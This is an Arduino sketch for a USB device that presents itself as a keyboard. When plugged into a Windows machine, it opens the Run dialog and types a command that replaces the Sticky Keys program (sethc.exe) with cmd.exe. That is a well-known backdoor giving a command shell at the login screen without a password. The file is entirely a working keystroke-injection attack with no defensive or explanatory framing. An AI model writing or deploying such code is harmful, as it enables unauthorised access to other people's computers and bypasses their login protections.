#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("cmd /c copy %SystemRoot%\\System32\\sethc.exe %SystemRoot%\\System32\\sethc_backup.exe & copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\System32\\sethc.exe");
}

void loop() {}
